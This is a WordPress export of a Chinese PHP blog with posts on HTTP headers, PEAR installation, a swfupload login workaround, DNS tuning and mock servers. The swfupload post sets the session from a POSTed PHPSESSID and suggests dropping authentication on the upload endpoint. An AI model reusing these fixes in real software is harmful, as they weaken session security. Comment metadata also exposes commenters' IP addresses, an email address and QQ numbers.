常见的状态码、状态描述和说明如下：
<ul>
	<li>200 OK：客户端请求成功</li>
	<li>400 Bad Request：客户端请求有语法错误，不能被服务器所理解</li>
	<li>401 Unauthorize：请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</li>
	<li>403 Forbidden：服务器收到请求，但是拒绝提供服务</li>
	<li>404 Not Found：请求资源不存在，例如输入了错误的URL</li>
	<li>500 Internal Server Error：服务器发生不可预期的错误</li>
	<li>503 Server Unavailable：服务器当前不能处理客户端的请求，一段时间后可能恢复正常</li>
</ul>
&nbsp;
<blockquote><strong>报头</strong></blockquote>
HTTP消息报头包括普通报头、请求报头、响应报头、实体报头。每个报头域组成形式如下：
<ol>
	<li>普通报头中有少数报头域用于所有的请求和响应消息，但并不用于被传输的实体，只用于传输的消息（如缓存控制、连接控制）</li>
	<li>请求报头允许客户端向服务器端传递请求的附加信息以及客户端自身的信息（如UA头、Accept等）</li>
	<li>响应报头允许服务器传递不能放在状态行中的附加响应信息，以及关于服务器的信息和对Request-URL所标的资源进行下一步访问的信息（如Location）</li>
	<li>实体报头定义了关于实体正文和请求所标识的资源的元信息，例如有无实体正文。</li>
</ol>
&nbsp;
比较重要的几个报头如下（可以结合着上面的截图看）：
<ul>
	<li>Host：头域指定请求资源的Internet主机和端口号，必须表示请求URL的原始服务器或网关的位置。HTTP1.1请求必须包含主机头域，否则系统会以400状态码返回。</li>
	<li>User-Agent：简称UA，内容包含发出请求的用户信息。通常UA包含浏览者的信息，主要是浏览器的名称版本和所用的操作系统。在上面的截图中可以看到，我的客户端电脑使用的是Gecko渲染引擎的浏览器，我用的Chrome，操作系统为Windows NT6.1的内核，即Windows 7操作系统（内核版本号和操作系统代号不是一一对应的）。这个UA头不仅仅是使用浏览器才存在，只要使用了基于HTTP协议的客户端软件都会发送这个请求，无论是手机端还是PDA等，这个UA头是辨别客户端所用设备的重要依据</li>
	<li>Accept：告诉服务器可以接受的文件格式，通常这个值在各种浏览器中都差不多。不过Wap浏览器所能接受的格式要少一点，这也是用来区分WAP和计算机浏览器的主要依据之一。随着WAP浏览器的升级，其已经和计算机浏览器越来越接近，因此这个判断所起的作用越来越弱。</li>
	<li>Cookie：Cookie分两种，一种是客户端向服务器端发送的，使用Cookie报头，用来标记一些信息；另一种是服务器发送给浏览器的，报头为Set-Cookie。两者的区别是Cookie报头的value里可以有多个cookie值，并且不需要显式指定domain等。而set-Cookie报头里一条记录只能有一个Cookie的value，需要指明domain、path等</li>
	<li>Cache-Control：指定请求和响应遵循的缓存机制。在请求消息或响应消息中设置Cache-Control并不会选择另一个消息处理过程中的缓存处理过程。请求时的缓存指令包括no-cache、no-store、max-age、max-stale、min-fresh、only-if-cached；响应消息中的指令包括public、private、no-cache、no-store、no-transform、must-revalidate、proxy-revalidate、max-age</li>
	<li>Referer：头域允许客户端指定请求URI的资源地址，这可以允许服务器生成回退链表，可以用来登录、优化缓存等。也允许废除的或错误的连接由于维护的目的而被追踪。如果请求的URI没有自己的URI地址，Referer不能被发送。如果指定的是部分URI地址，则此地址应该是一个相对地址。Referer通常是流量统计系统来记录来访者地址的参数。</li>
	<li>Content-Length：内容长度</li>
	<li>Content-Range：响应的资源范围。可以在每次请求中标记请求的资源范围，在连接断开重连时，客户端只请求该资源未下载的部分，而不是重新请求整个资源，<strong>实现断点续传</strong>。<span style="color: #ff0000;">迅雷就是基于这个原理，使用多线程分段读取网络上的资源，最后再合并。</span></li>
	<li>Accept-Encoding：指定所能接受的编码方式。通常服务器会对页面进行GZIP压缩后再输出以减少流量，一般浏览器均支持对这种压缩后的数据进行处理。但对于我们来说，如果不想接受到这些看似“乱码”的数据，可以指定不接受任何服务器端压缩处理，要求其原样返回</li>
	<li>自定义报头：在HTTP消息中，也可以使用一些HTTP1.1正式规范里没有定义的头字段，这些头字段统称为自定义的HTTP头或者扩展头。比如上面截图中X-Powered-By字段，这是由服务器发送的。在PHP里，使用header函数即可实现。</li>
</ul>
&nbsp;
参考：《PHP核心技术与最佳实践》]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>466</wp:post_id>
		<wp:post_date><![CDATA[2015-01-06 14:44:24]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-01-06 14:44:24]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[http%e5%8d%8f%e8%ae%ae%e6%98%af%e5%a6%82%e4%bd%95%e5%b7%a5%e4%bd%9c%e7%9a%84]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="http"><![CDATA[HTTP]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="bianchengyuyan"><![CDATA[编程语言]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c"><![CDATA[网络]]></category>
						</item>
					<item>
		<title>pear安装</title>
		<link>http://wp.veitor.net/2015/01/07/pear%e5%ae%89%e8%a3%85/</link>
		<pubDate>Wed, 07 Jan 2015 08:45:13 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=470</guid>
		<description></description>
		<content:encoded><![CDATA[说到安装pear，我是因为给一个变量起一个名字，联想到了如何起名才规范，于是又联想到了PHPDocument，要安装PHPDocument可以通过pear安装和手动下载安装，于是乎我就折腾起了这个pear的安装。
根据：http://pear.php.net/manual/en/installation.getting.php中的内容翻译得来
点此http://pear.php.net/go-pear.phar下载文件到本地并命名为go-pear.phar进行保存。在cmd中输入<span class="lang:php decode:true  crayon-inline">php go-pear.phar</span> 开始安装。
<pre class="lang:php decode:true">Are you installing a system-wide PEAR or a local copy?
(system|local) [system] :</pre>
<strong> 选择系统级别安装还是安装本地，默认是system，直接按回车继续。</strong>
<pre class="lang:php decode:true">Below is a suggested file layout for your new PEAR installation.  To
change individual locations, type the number in front of the
directory.  Type 'all' to change all of them or simply press Enter to
accept these locations.
 1. Installation base ($prefix)                   : D:\php5
 2. Temporary directory for processing            : D:\php5\tmp
 3. Temporary directory for downloads             : D:\php5\tmp
 4. Binaries directory                            : D:\php5
 5. PHP code directory ($php_dir)                 : D:\php5\pear
 6. Documentation directory                       : D:\php5\docs
 7. Data directory                                : D:\php5\data
 8. User-modifiable configuration files directory : D:\php5\cfg
 9. Public Web Files directory                    : D:\php5\www
10. Tests directory                               : D:\php5\tests
11. Name of configuration file                    : C:\Windows\pear.ini
12. Path to CLI php.exe                           : D:\php5
1-12, 'all' or Enter to continue:</pre>
<strong>以上是默认的pear的临时、数据、配置、测试、执行目录的设置，第11项默认的话会显示错误，我所以还是改到了D:\php5目录下（输入需要改的数字项，会提示让你输入新的目录地址，不改的话啥也不用输入直接回车）。然后回车。</strong>
<strong>然后一系列安装，其中有以下这个警告：</strong>
<pre class="lang:php decode:true">WARNING!  The include_path defined in the currently used php.ini does not
contain the PEAR PHP directory you just specified:
&lt;D:\php5\pear&gt;
If the specified directory is also not in the include_path used by
your scripts, you will have problems getting any PEAR packages working.
Would you like to alter php.ini&lt;D:\php5\php.ini&gt;?[Y/n]</pre>
<strong>需要将pear配置目录D:\php5\pear加入php.ini的include_path指令中。输入Y后自动修改php.ini中的路径。</strong>
<pre class="lang:php decode:true">php.ini &lt;D:\php5\php.ini&gt; include_path updated.
Current include path           : .;C:\php\pear
Configured directory           : D:\php5\pear
Currently used php.ini (guess) : D:\php5\php.ini
Press Enter to continue:</pre>
<strong> 到这里也没啥了，按回车基本安装成功了。会在D:\php5下面生成一个PEAR_ENV.reg的文件，双击运行进行注册表注册即可。</strong>
通过命令pear install package安装程序包，如果出现failed to mkdir的错误，只要以管理员身份重新运行cmd即可。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>470</wp:post_id>
		<wp:post_date><![CDATA[2015-01-07 08:45:13]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-01-07 08:45:13]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[pear%e5%ae%89%e8%a3%85]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="pear"><![CDATA[pear]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
		<category domain="category" nicename="bianchengyuyan"><![CDATA[编程语言]]></category>
						</item>
					<item>
		<title>关于swfupload插件无法上传文件的问题</title>
		<link>http://wp.veitor.net/2015/01/17/%e5%85%b3%e4%ba%8eswfupload%e6%8f%92%e4%bb%b6%e6%97%a0%e6%b3%95%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e7%9a%84%e9%97%ae%e9%a2%98/</link>
		<pubDate>Sat, 17 Jan 2015 08:59:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=476</guid>
		<description></description>
		<content:encoded><![CDATA[因为项目上所使用的flash上传图片插件名叫swfupload，但里面的js写法好像另一个上传插件sapload，所以我也搞不清到底是哪个，但最终了解到这两个插件都是有共同的一个问题，就是对需要进行身份才能上传文件的方式会失效。
我们都知道服务器端要对识别当前用户登录状态需要客户端cookie的支持，请求URL时会带着cookie，服务器端才能找到对应的session。而使用这个flash插件上传文件请求接口时，如果被请求的接口需要登陆才能传文件的话，那很可能就会失败。
<strong>一种原因是说：因为该插件会忽略部分浏览器下的cookie，IE和chrome下是正常的，像火狐等浏览器上传文件时，服务器端会发现请求带过来的cookie是空的<span style="color: #ff0000;">（建议尝试打印一下cookie）</span>。</strong>
<strong>另一种可能的说法：该插件是通过soket套接字进行通信，相当于建立了一次新对话，即使请求带着cookie过去了，但打印出来发现存储的sessionid并不是当前登录时的，因此用户身份又验证失败。（建议多打印cookie并查看）</strong>
<strong><span style="color: #0000ff;">归根到底，无法上传文件的原因就是无法验证身份。</span></strong>
解决方法有两种：
1、在初始化flash插件时，在js代码中设置一下传递参数（可参考其插件手册）。swfupload插件中增加一个post_params选项，格式如<span class="lang:php decode:true  crayon-inline ">post_params:{"PHPSESSID": &lt;?php echo session_id(); ?&gt;}</span> ，sapload插件中增加一个args选项，格式如<span class="lang:php decode:true  crayon-inline ">args:"PHPSESSID=&lt;?php echo session_id(); ?&gt;"</span> 。这两个意思都是在post文件时，带上参数PHPSESSID（注：后端是PHP脚本）。
<span style="color: #0000ff;">咱用不了cookie中的值，那就用POST过来值</span>，然后在PHP脚本中处理一下：
<pre class="lang:php decode:true">if(isset($_POST['PHPSESSID'])){
    session_id($_POST['PHPSESSID']);
    session_start()
}</pre>
这样就可以使用当前登录正确的session id进行一系列操作了。
2、取消上传URL接口的登陆验证。（有点蛋疼，非必要情况下还是使用第一种方法吧）
&nbsp;
&nbsp;
附（这是给我自己看的，swfupload好像格式有所不同，如本文开头提到的，不知道是不是同一个插件）：
<strong>flash 接口文档：</strong>
upUrl ：后台文件的地址，必须要绝对路径
etmsg：每次文件上传成功后需不需要回调函数（0|1），默认回调函数为sapLoadMsg(x)函数。
ltmsg：最后一个文件上传成功后需不需要回调函数（0|1），默认回调函数为sapLoadMsg(x)函数。
types：上传文件的类型（如*.apk;*.jpg）用分号分隔各个类型
args：需要传递的参数（如apkName=123;apkName1=1234)用分号分隔各个类型
fileName：此参数可选，允许你自定义文件域名称，默认是Filedata。
maxNum：当最大上传数为1的时候自动切换到单文件上传模式，用户将不能在使用多选选取文件。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>476</wp:post_id>
		<wp:post_date><![CDATA[2015-01-17 08:59:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-01-17 08:59:29]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%b3%e4%ba%8eswfupload%e6%8f%92%e4%bb%b6%e6%97%a0%e6%b3%95%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e7%9a%84%e9%97%ae%e9%a2%98]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="flash"><![CDATA[flash]]></category>
		<category domain="category" nicename="js"><![CDATA[JS]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="session"><![CDATA[session]]></category>
		<category domain="category" nicename="bianchengyuyan"><![CDATA[编程语言]]></category>
						</item>
					<item>
		<title>关于php中curl慢的问题</title>
		<link>http://wp.veitor.net/2015/01/22/%e5%85%b3%e4%ba%8ephp%e4%b8%adcurl%e6%85%a2%e7%9a%84%e9%97%ae%e9%a2%98/</link>
		<pubDate>Thu, 22 Jan 2015 06:57:54 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=479</guid>
		<description></description>
		<content:encoded><![CDATA[今天在自己的服务器上运行程序时需要远程请求一个接口，发现此时程序响应特别慢，平均时间都要十几秒。
最后断定问题出现在了curl地方，使用服务器命令（我的是centos）curl一个域名也很慢，但curl一个IP却能得到及时响应。（因此其实本文标题说是PHP中的问题是不严谨的）
这说明问题可能就出现在了DNS设置上，后来改了一下DNS后发现正常了，在此写文记一下。
配置DNS：
输入命令<span class="lang:php decode:true  crayon-inline ">vi /etc/resolv.conf</span>
设置一下DNS，我这里使用的阿里DNS
<pre class="lang:php decode:true">nameserver 223.5.5.5
nameserver 223.6.6.6</pre>
最后再重启下php和nginx
<pre class="lang:php decode:true ">/etc/init.d/php-fpm restart
/etc/init.d/php-fpm restart</pre>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>479</wp:post_id>
		<wp:post_date><![CDATA[2015-01-22 06:57:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-01-22 06:57:54]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%b3%e4%ba%8ephp%e4%b8%adcurl%e6%85%a2%e7%9a%84%e9%97%ae%e9%a2%98]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="dns"><![CDATA[DNS]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>Web前后端分离开发思路</title>
		<link>http://wp.veitor.net/2015/02/01/web%e5%89%8d%e5%90%8e%e7%ab%af%e5%88%86%e7%a6%bb%e5%bc%80%e5%8f%91%e6%80%9d%e8%b7%af/</link>
		<pubDate>Sun, 01 Feb 2015 14:36:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=482</guid>
		<description></description>
		<content:encoded><![CDATA[<h2 id="articleHeader0">1. 问题的提出</h2>
开发一个Web应用的时候我们一般都会简单地分为前端工程师和后端工程师（注：在一些比较复杂的系统中，前端可以细分为外观和逻辑，后端可以分为CGI和Server）。前端工程师负责浏览器端用户交互界面和逻辑等，后端负责数据的处理和存储等。前后端的关系可以浅显地概括为：后端提供数据，前端负责显示数据。
在这种前后端的分工下，会经常有一些疑惑：<strong>既然前端数据是由后端提供，那么后端数据接口还没有完成，前端是否就无法进行编码？怎么样才能做到前后端独立开发？</strong>
考虑这么一个场景：Alex和Bob是一对好基友，他们有个可以颠覆世界的idea，准备把它实现出来，但是他们不需要程序员，因为他们就是程序员。说干就干，两个就干上了。Alex写前端，Bob写后端。
Alex和Bob都经过良好的训练，按部就班地把产品的主要功能设计，交互原型，视觉设计做好了，然后他们根据产品功能和交互制定了一堆叼炸天的前后端交互的API，这套API就类似于一套前后端开发的“协议”，Alex和Bob开发的时候都需要遵守。例如其中一个发表评论的功能：
<pre><code>// API: Create New Comment v2
// Ajax, JSON, RESTful
url: /comments
type: POST
request: {content: "comment content.", userId: 123456}
response:
    - status: 200
        data: {result: "SUCCESS", msg: "The comment has been created."}
    - status: 404
        data: {result: "failed", msg: "User is not found."}
</code></pre>
Alex的前端需要向/comments这个url以POST的方式发送类似于{content: "comment content.", userId: 123456}这样的JSON请求数据；Bob的服务端识别后以后，操作成功则返回200状态和上面的JSON的数据，不同的操作状态有不同的响应数据（为了简单起见只列出了两种，200和404）。
API制定完以后，Alex和Bob就开始编码了。Alex把评论都外观和交互写完了，但是写到发表评论功能就纳闷了：Alex现在需要发Ajax过去，但是只能把Ajax代码写好，因为是本地服务器，却无法获取到数据：
<pre><code>// jQuery Ajax
$.ajax({ // 这个ajax直接报错，因为这个是Alex的前端服务器，请求无法获取数据；
    url: "/comments",
    type: "POST",
    data: {content: content, userId: userId},
    success: funtion(data) {
        // 这里不会被执行
    }
})
</code></pre>
相比起来Bob就没有这个烦恼，因为后端是基于测试驱动开发，且后端可以轻易地模拟前端发送请求，可以对前端没有依赖地进行开发和测试。
Alex把这种情况和Bob说了，Bob就说，要不我们把代码弄到你本地前后端连接一下，这不就可以测试了吗。Alex觉得Bob简直是天才。
他们把前后端代码代码都部署到Alex的本地服务器以后，经过一系列的测试，调试，终于把这个API连接成功了。但是他们发现这个方法简直不科学：难道每写一个API都要把前后端链接测试一遍吗？而且，Alex的如果需要测试某个API，而Bob的这个API还没写好，Alex这个功能模块的进度就“阻塞”了。
后面还有168个API需要写，不能这么做。Alex和Bob就开始思考这个问题的解决方案。
<h2 id="articleHeader1">2. 解决思路</h2>
在这个场景下，前后端是有比较强的数据依赖的关系，后端依赖前端的请求，前端依赖后端的响应。而后端可以轻松模拟前端请求（基本上能写后端的语言都可以直接发送HTTP请求），前端没有一个比较明显的方案来可以做到模拟响应，所以这里的需要解决的点就是：<strong>如何给前端模拟的响应数据</strong>。
先来一句非常形而上的话：如果两个对象具有强耦合的关系，我们一般只要引入第三个对象就可以打破这种强耦合的关系。
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2015/02/QQ截图20150201223003.jpg" target="_blank" rel="noopener noreferrer"><img class="aligncenter  wp-image-488" style="width: 295px; height: 419px;" alt="QQ截图20150201223003" src="http://storage.veitor.net/uploads/2015/02/QQ截图20150201223003.jpg" width="295" height="419" /></a></p>
<span style="line-height: 1.5em;">在我们上述开发的过程中，前后端的耦合性太强了，我们需要借助额外的东西来打破它们的耦合性。所以，在前后端接口定下来以后，</span><strong style="line-height: 1.5em;">我们根据接口构建另外一个Server，这个Server会一一响应前端的请求，并且根据接口返回数据</strong><span style="line-height: 1.5em;">。当然这些数据都是假数据。我们把这个Server叫做</span><em style="line-height: 1.5em;">Mock Server</em><span style="line-height: 1.5em;">，而Bob真正在开发的Server叫做</span><em style="line-height: 1.5em;">Real Server</em><span style="line-height: 1.5em;">。</span>
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2015/02/QQ截图20150201223038.jpg" target="_blank" rel="noopener noreferrer"><img class="aligncenter size-full wp-image-489" style="width: 458px; height: 293px;" alt="QQ截图20150201223038" src="http://storage.veitor.net/uploads/2015/02/QQ截图20150201223038.jpg" width="458" height="293" /></a></p>
<span style="line-height: 1.5em;">Mock Server是根据API实现的，但是是没有数据逻辑的，只是非常简单地返回数据。例如上面Alex和Bob的发表评论的接口在Mock Server上是这样的：</span>
<pre><code>// Mock Server
// Create New Comment API
route.post("/comments", function(req, res) {
    res.send(200, {result: "Success"});
})
</code></pre>
Alex在开发的时候向Mock Server发出请求，而不是向Bob的服务器发出请求：
<pre><code>// Sending Request to Mock Server
// jQuery Ajax
$.ajax({
    url: config.HOST + "/comments",
    type: "POST",
    data: {content: content, userId: userId},
    success: funtion(data) {
        // OK
    }
})
</code></pre>
注意上面的<code>config.HOST</code>，我们把服务器配置放在一个全局共用的模块当中：
<pre><code>// Front-end Configuration Module
var config = modules.exports;
config.HOST = "http://192.169.10.20" // Mock Server IP
</code></pre>
那么上面我们其实是向IP为<code>http://192.169.10.20</code>的Mock Server发出请求<code>http://192.169.10.20/comments</code>发出POST的请求。
当Alex和Bob都代码写好了以后，需要连接调试了，Alex只要简单地改一下配置文件即可把所有的请求都转向Bob所开发的Real Server：
<pre><code>// Front-end Configuration Module
var config = module.exports;
// config.HOST = "http://192.169.10.20" // Mock Server IP
config.HOST = "http://changing-world-app.com" // Real Server Domain
</code></pre>
然后Alex和Bob就可以愉快地分离独立开发，而最后只需要联合调试就可以了。
总结一下基本上前后端分离开发包括下面几个步骤：
<ol>
	<li>根据功能制定前后端接口（API）。</li>
	<li>根据接口构建Mock Server工程及其部署。</li>
	<li>前后端独立开发，前端向Mock Server发送请求，获取模拟的数据进行开发和测试。</li>
	<li>前后端都完成后，前后端连接调试（前端修改配置向Real Server而不是Mock Server发送请求）。</li>
</ol>
当然要注意，如果接口修改了，Mock Server要同步修改。
<h2 id="articleHeader2">3. 实现方案</h2>
Mock Server具体应该如何构建？应该存放在哪里？应该怎么维护？
前后端是不同的两个工程，它们各自占用一个仓库。Mock Server应该和它们分离出来，独立进行开发和维护，也就是说会有三个仓库，Mock Server是一个单独的工程。
Mock Server可以部署在本地，也可以部署到远程服务器，两者之间各有优劣。
<hr />
<h3 id="articleHeader3">3.1 远程Mock Server</h3>
<strong>做法</strong>：把Mock Server工程部署到一个远程的always on的远程服务器上，前端开发的时候向该服务器发请求。
<strong>优点</strong>：
<ol>
	<li>没有给原有的前后端工程增加负担。</li>
	<li>每个前端开发人员向同一个Mock Server服务器发送请求，保持所有人获取响应请求的一致性。</li>
</ol>
<strong>缺点</strong>：
<ol>
	<li>有跨域问题（思考：locahost如何向192.169.10.20发请求？）。</li>
	<li>需要额外的远程服务器支持。</li>
</ol>
（在写这篇博客的时候，逛<a href="https://news.ycombinator.com/" target="_blank" rel="nofollow noopener noreferrer">Hacker News</a>，刚好看到有人做了一个开发辅助工具（<a href="http://reqr.es/" target="_blank" rel="nofollow noopener noreferrer">http://reqr.es/</a>），可以用于开发时响应前端请求，其实也就是这里所说的远程Mock Server。真是不能再巧更多。）
<h3 id="articleHeader4">3.2 本地Mock Server</h3>
<strong>做法</strong>：前端把Mock Server克隆到本地，开发的时候，开启前端工程服务器和Mock Server，所有的请求都发向本地服务器，获取到Mock数据。
<strong>优点</strong>：
<ol>
	<li>节约资源，不需要依赖远程服务器。环保节能。</li>
	<li>没有跨域问题。</li>
</ol>
<strong>缺点</strong>：
<ol>
	<li>增加前端工程开发流程复杂程度。</li>
	<li>每个前端开发人员自己部署服务器在本地，可能会有仓库没有及时更新导致API不一致的情况。</li>
</ol>
<hr />
Mock Server工程一般可以由后端开发人员来维护。因为在开发的过程中，后端因为各种原因可能需要修改API，后端人员是最熟悉请求的响应数据和格式的人，可以同步维护Mock Server和Real Server，更好保证数据的一致。Mock Server维护起来并不复杂，对于比较大多工程来说，这样的前期准备和过程的维护是非常值得的。
<h2 id="articleHeader5">最后</h2>
所以要点就是：<strong>根据API构建可以模拟服务器响应的Mock Server，用于前端请求模拟数据进行测试</strong>。
再重复总结一下前后端分离开发包括下面几个步骤：
<ol>
	<li>根据功能制定前后端接口。</li>
	<li>根据接口构建Mock Server工程及其部署。</li>
	<li>前后端独立开发，前端向Mock Server发送请求，获取模拟的数据进行开发和测试。</li>
	<li>前后端都完成后，前后端连接调试。</li>
</ol>
当开发只有我一个人的时候，我更喜欢后端独立开发，开发前端的时候开个Real Server来做响应。又爽又快。其实如果团队的人是full-stack的话，完全可以按照功能模块来划分任务，而不是分为前端工程师和后端工程师。
但一般来说还是会选择前后端职能划分，对于这种情况下的多人开发的工程来说，前后端分离开发的方式确实需要考虑和构建的，可以更好帮助我们构建一个高效，规范化，流程化的开发流程。
还是那句话，没有银弹，所有的东西都需要根据实际情况来构建独特的流程。
<strong>原文链接：http://segmentfault.com/blog/livoras/1190000002413526</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>482</wp:post_id>
		<wp:post_date><![CDATA[2015-02-01 14:36:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-02-01 14:36:04]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[web%e5%89%8d%e5%90%8e%e7%ab%af%e5%88%86%e7%a6%bb%e5%bc%80%e5%8f%91%e6%80%9d%e8%b7%af]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e5%89%8d%e7%ab%af"><![CDATA[前端]]></category>
		<category domain="post_tag" nicename="%e5%90%8e%e7%ab%af"><![CDATA[后端]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
		<category domain="post_tag" nicename="%e8%bd%ac%e8%bd%bd"><![CDATA[转载]]></category>
						<wp:comment>
			<wp:comment_id>21</wp:comment_id>
			<wp:comment_author><![CDATA[水牛]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[]]></wp:comment_author_email>
			<wp:comment_author_url>http://t.qq.com/jjtuinc</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[58.17.82.100]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-02-04 01:23:42]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-02-04 01:23:42]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[呵呵  您好， 我也是刚学php 但是年龄比较大，很多学的非常慢， 希望认识一下你， 多指点一下。 我的 qq:258410919]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>22</wp:comment_id>
			<wp:comment_author><![CDATA[Veitor]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[dandankele@vip.qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.veitor.net</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[61.160.251.57]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-02-04 07:29:09]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-02-04 07:29:09]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[QQ56098484]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>21</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>PHP命名大小写敏感规则</title>
		<link>http://wp.veitor.net/2015/02/25/php%e5%91%bd%e5%90%8d%e5%a4%a7%e5%b0%8f%e5%86%99%e6%95%8f%e6%84%9f%e8%a7%84%e5%88%99/</link>
		<pubDate>Wed, 25 Feb 2015 14:44:24 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=501</guid>
		<description></description>
		<content:encoded><![CDATA[一直觉得PHP中各种大小写规则理不清，就连工作多年的老手们也不一定能对PHP大小写敏感问题足够了解。在PHP中，大小写敏感问题的处理比较乱，大家一定要注意。即使某些地方大小写不敏感，但在编程过程中能始终坚持“大小写敏感”是最好不过的。下面整理了一些大小写问题注意点：
<blockquote><strong>大小写敏感</strong></blockquote>
<strong>1. 变量名区分大小写</strong>
所有变量均区分大小写，包括普通变量以 及$_GET,$_POST,$_REQUEST,$_COOKIE,$_SESSION,$GLOBALS,$_SERVER,$_FILES,$_ENV 等；
<pre class="lang:php decode:true">&lt;?php
$abc = 'abc';
echo $abc;    //输出'abc'
echo $aBc;    //无输出
echo $ABC;    //无输出
?&gt;</pre>
<strong>2、常量名区分大小写</strong>
使用define定义的常量是区分大小写的。
<pre class="lang:php decode:true">&lt;?php
define('BLOGGER','Veitor');
